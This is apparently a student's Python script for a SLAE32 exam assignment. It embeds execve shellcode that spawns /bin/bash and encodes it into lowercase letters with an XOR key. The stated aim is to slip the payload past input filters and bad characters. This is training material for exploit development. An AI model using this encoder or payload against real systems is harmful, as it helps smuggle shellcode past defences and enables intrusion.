#!/usr/bin/python3

# SLAE32 Exam A4 - Custom Encoding Scheme
# William Moody
# PA-25640
# 28.12.2021

import math
import random

# execve stack shellcode from course
shellcode = b"\x31\xc0\xb0\x68\x50\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# This scheme encrypts shellcode to only lowercase latin characters
# to be able to slip through filters and avoid many badchars.

key = 0x41

# To encode 0x31 with key 0x52:
# 0x31 ^ 0x52 = 0x63
# 6 => 6 + 97 = 103
# 3 => 3 + 97 = 100
# Encoded byte => 'gd' = 0x6764

def encode_byte(b):
	b = b ^ key
	l = (b & 0xf0) >> 4
	r = b & 0x0f
	l_enc = l + 97
	r_enc = r + 97
	return chr(l_enc) + chr(r_enc)

# To decode 'gd' (0x6764) with key 0x52:
# 0x67 => 103 - 97 = 6
# 0x64 => 100 - 97 = 3
# 0x63 ^ 0x52 = 0x31
# Decoded byte => 0x31

def decode_byte(b):
	l = ord(b[0])
	r = ord(b[1])
	l_dec = l - 97
	r_dec = r - 97
	dec = (l_dec << 4) + r_dec
	return dec ^ key

def encode_shellcode(shellcode):
	enc_shellcode = ""
	for b in shellcode:
		enc_shellcode += encode_byte(b)
	return enc_shellcode

def decode_shellcode(enc_shellcode):
	i = 0
	j = 0
	dec_shellcode = ""
	while i < len(enc_shellcode):
		enc_byte = enc_shellcode[i] + enc_shellcode[i+1]
		dec_shellcode += "\\x%.2x" % decode_byte(enc_byte)
		j += 1
		i += 2
	return dec_shellcode

if __name__ == "__main__":
	enc_shellcode = encode_shellcode(shellcode)
	#print("Orig =", "".join(["\\x%.2x" % i for i in shellcode]))
	
	dec_shellcode = decode_shellcode(enc_shellcode)
	#print("Dec. =", dec_shellcode)
	
	print('Len. = 0x%.2x (%d)' % (len(shellcode), len(shellcode)))
	print()
	print('key: db 0x%.2x' % key)
	print('shellcode: db "' + enc_shellcode + '"')
